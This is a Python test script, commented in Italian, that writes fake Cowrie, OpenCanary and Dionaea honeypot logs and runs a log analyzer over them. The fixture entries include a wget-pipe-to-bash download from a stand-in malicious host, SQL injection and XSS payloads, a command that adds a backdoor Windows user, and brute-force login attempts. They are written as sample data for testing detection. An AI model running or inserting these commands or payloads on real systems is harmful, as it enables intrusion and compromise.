"""
test_analyzer.py
================
Genera log FINTI di Cowrie, OpenCanary e Dionaea
e lancia l'analyzer per testarlo senza honeypot reale.

Esegui con:
    python test_analyzer.py
"""

import json
import os
import shutil

# ─── Crea cartelle log di test ────────────────────────────────────────────

os.makedirs("var/log/cowrie",     exist_ok=True)
os.makedirs("var/log/opencanary", exist_ok=True)
os.makedirs("var/log/dionaea",    exist_ok=True)


# ─── Log COWRIE finti ─────────────────────────────────────────────────────

cowrie_events = [
    {"src_ip": "185.234.219.12", "timestamp": "2026-03-31T10:00:00",
     "dst_port": 22, "eventid": "cowrie.login.failed",
     "username": "root", "password": "123456"},

    {"src_ip": "185.234.219.12", "timestamp": "2026-03-31T10:00:02",
     "dst_port": 22, "eventid": "cowrie.login.failed",
     "username": "root", "password": "password"},

    {"src_ip": "91.108.4.3", "timestamp": "2026-03-31T10:05:00",
     "dst_port": 22, "eventid": "cowrie.command.input",
     "input": "wget http://malware.ru/bot.sh | bash"},

    {"src_ip": "203.0.113.42", "timestamp": "2026-03-31T10:10:00",
     "dst_port": 23, "eventid": "cowrie.login.failed",
     "username": "admin", "password": "admin"},
]

with open("var/log/cowrie/cowrie.json", "w") as f:
    for e in cowrie_events:
        f.write(json.dumps(e) + "\n")

# Aggiungi tanti tentativi brute force per far scattare "high confidence"
with open("var/log/cowrie/cowrie.json", "a") as f:
    for i in range(15):
        f.write(json.dumps({
            "src_ip": "185.234.219.12",
            "timestamp": f"2026-03-31T10:00:{10+i:02d}",
            "dst_port": 22,
            "eventid": "cowrie.login.failed",
            "username": "root",
            "password": f"pass{i}"
        }) + "\n")

print("[TEST] cowrie.json creato.")


# ─── Log OPENCANARY finti ─────────────────────────────────────────────────

opencanary_events = [
    {"src_host": "45.33.32.156", "utc_time": "2026-03-31T11:00:00",
     "dst_port": 80, "logtype": 2,
     "logdata": {"USERAGENT": "sqlmap/1.7.2", "PATH": "/login?id=1' OR 1=1--"}},

    {"src_host": "198.51.100.7", "utc_time": "2026-03-31T11:05:00",
     "dst_port": 21, "logtype": 1,
     "logdata": {"USERNAME": "anonymous", "PASSWORD": ""}},

    {"src_host": "104.21.56.89", "utc_time": "2026-03-31T11:10:00",
     "dst_port": 80, "logtype": 2,
     "logdata": {"USERAGENT": "Mozilla/5.0",
                 "PATH": "/search?q=<script>alert(document.cookie)</script>"}},
]

with open("var/log/opencanary/opencanary.log", "w") as f:
    for e in opencanary_events:
        f.write(json.dumps(e) + "\n")

print("[TEST] opencanary.log creato.")


# ─── Log DIONAEA finti ────────────────────────────────────────────────────

dionaea_events = [
    {"src_ip": "77.88.55.60", "timestamp": "2026-03-31T12:00:00",
     "dst_port": 445, "protocol": "smb",
     "download_md5_hash": "d41d8cd98f00b204e9800998ecf8427e"},

    {"src_ip": "1.2.3.4", "timestamp": "2026-03-31T12:05:00",
     "dst_port": 4444, "protocol": "shell",
     "payload": "cmd.exe /c net user hacker P@ss123 /add"},
]

with open("var/log/dionaea/dionaea.json", "w") as f:
    json.dump(dionaea_events, f, indent=2)

print("[TEST] dionaea.json creato.")

# ─── Lancia analyzer ──────────────────────────────────────────────────────

print("\n[TEST] Avvio analyzer...\n")

# Rimuovi DB precedente se esiste
if os.path.exists("honeypot_data.db"):
    os.remove("honeypot_data.db")

from analyzer import analyze_all, print_stats, export_json

analyze_all()
print_stats()
export_json("events_export.json")

print("\n[TEST] ✅ Tutto ok! Controlla:")
print("       → honeypot_data.db   (database SQLite)")
print("       → events_export.json (export per dashboard)")
